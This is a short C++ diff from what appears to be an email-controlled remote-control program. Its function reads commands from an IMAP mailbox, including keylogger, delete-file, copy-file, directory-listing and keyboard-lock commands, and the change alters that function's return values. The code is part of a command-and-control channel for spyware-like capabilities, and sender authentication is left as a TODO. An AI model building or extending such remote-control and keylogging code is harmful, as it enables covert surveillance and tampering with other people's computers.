@@ -73,7 +73,7 @@ string getMessageTextBody(message& msg) {
 	return body;
 }
 
-bool receivedNewCommand(imaps& conn, string& title, string& nameObject, string& source, string& destination) {
+string receivedNewCommand(imaps& conn, string& title, string& nameObject, string& source, string& destination) {
     // mail message to store the fetched one
     message msg;
 
@@ -81,7 +81,7 @@ bool receivedNewCommand(imaps& conn, string& title, string& nameObject, string& 
     msg.line_policy(codec::line_len_policy_t::MANDATORY);
 
     // if there is no new mail, return false
-    if (!getNewMail(conn, msg)) return false;
+    if (!getNewMail(conn, msg)) return "NO";
 
     // TODO: authenticate the sender
 
@@ -98,7 +98,9 @@ bool receivedNewCommand(imaps& conn, string& title, string& nameObject, string& 
         title == DELETE_FILE ||
         title == KEYLOGGER
         ) {
+        if (body.empty()) return "ERROR";
         nameObject = body;
+		return "YES";
     }
 
     if (title == COPY_FILE) {
@@ -106,6 +108,7 @@ bool receivedNewCommand(imaps& conn, string& title, string& nameObject, string& 
         getline(ss, source, '\n'); // get the first line (source)
         getline(ss, destination, '\n'); // get the second line (destination)
         source = source.substr(0, source.size() - 1);
+		return "YES";
     }
 
     if (
@@ -120,11 +123,11 @@ bool receivedNewCommand(imaps& conn, string& title, string& nameObject, string& 
         title == LIST_DIRECTORY_TREE ||
         title == LOCK_KEYBOARD ||
         title == UNLOCK_KEYBOARD ||
-        title == END_PROGRAM
+        title == DISCONNECT
         ) {
+        return "YES";
     }
-
-    return true;
+    return "NO";
 }
 
 // connect to the smtp server
